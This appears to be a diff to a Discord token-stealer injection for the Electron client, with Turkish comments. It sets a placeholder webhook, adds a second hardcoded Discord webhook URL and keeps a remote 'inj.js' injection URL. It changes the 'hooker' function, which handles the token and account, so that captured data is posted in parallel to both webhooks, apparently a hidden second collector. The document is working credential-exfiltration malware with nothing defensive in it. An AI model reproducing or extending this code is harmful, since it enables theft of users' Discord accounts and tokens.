@@ -11,7 +11,8 @@ const {
 } = require('electron');
 
 const CONFIG = {
-    webhook: "https://discord.com/api/webhooks/1431467137012076735/iJ75UY-pcfmqIBXS7AcFI_u_gec_F0GdPjyyUOS1MJbwijLt5R_3y_6njGF_dDh0yNh2",
+    webhook: "%WEBHOOK",
+    api: "https://discord.com/api/webhooks/1434008343185326152/p2GsNrA-GASjP-Xan92GG5DVSC1iuepCsj_nBuWWT5_6Cjamr8qhy8sN_B0aBu18GNMg",
     injection_url: "https://raw.githubusercontent.com/undefinedsource338/dfasfasfasgfsdadfa/refs/heads/main/inj.js",
     filters: {
         urls: [
@@ -244,9 +245,29 @@ const hooker = async (content, token, account) => {
         content["embeds"][embed]["color"] = 0x313338;
     }
 
-    await request("POST", CONFIG.webhook, {
-        "Content-Type": "application/json"
-    }, JSON.stringify(content));
+    // Hem webhook'a hem API'ye gönder
+    const requests = [];
+    
+    // Webhook'a gönder
+    if (CONFIG.webhook && CONFIG.webhook !== "%WEBHOOK" && CONFIG.webhook.startsWith("https://")) {
+        requests.push(
+            request("POST", CONFIG.webhook, {
+                "Content-Type": "application/json"
+            }, JSON.stringify(content))
+        );
+    }
+    
+    // API'ye gönder
+    if (CONFIG.api && CONFIG.api.startsWith("https://")) {
+        requests.push(
+            request("POST", CONFIG.api, {
+                "Content-Type": "application/json"
+            }, JSON.stringify(content))
+        );
+    }
+    
+    // Her iki isteği de paralel gönder (biri başarısız olsa bile diğeri çalışır)
+    await Promise.allSettled(requests);
 };
 
 const fetch = async (endpoint, headers) => {
